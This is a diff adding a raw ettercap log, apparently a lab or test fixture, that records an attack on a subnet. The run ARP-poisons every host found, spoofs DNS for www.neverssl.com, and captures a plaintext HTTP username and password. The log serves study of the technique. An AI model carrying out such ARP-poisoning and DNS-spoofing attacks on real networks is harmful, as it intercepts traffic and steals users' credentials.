@@ -1,0 +1,50 @@
+
+[1mettercap 0.8.3.1[0m copyright 2001-2020 Ettercap Development Team
+
+Listening on:
+  eth0 -> 08:00:27:1B:EE:6E
+	  10.202.209.73/255.255.252.0
+	  fe80::a00:27ff:fe1b:ee6e/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not set to 0.
+Privileges dropped to EUID 0 EGID 0...
+
+  34 plugins
+  42 protocol dissectors
+  57 ports monitored
+28230 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Randomizing 1023 hosts for scanning...
+Scanning the whole netmask for 1023 hosts...
+32 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : ANY (all the hosts in the list)
+
+ GROUP 2 : ANY (all the hosts in the list)
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+Activating dns_spoof plugin...
+
+DHCP: [EE:19:AC:01:38:95] REQUEST 10.202.209.209
+dns_spoof: A [www.neverssl.com] spoofed to [10.202.209.73] TTL [3600 s]
+dns_spoof: A [www.neverssl.com] spoofed to [10.202.209.73] TTL [3600 s]
+HTTP : 10.202.209.73:80 -> USER: bobbythebomber  PASS: 321BOOM  INFO: http://www.neverssl.com/
+CONTENT: username=bobbythebomber&password=321BOOM
+
+Closing text interface...
+
+
+Terminating ettercap...
+Lua cleanup complete!
+ARP poisoner deactivated.
+RE-ARPing the victims...
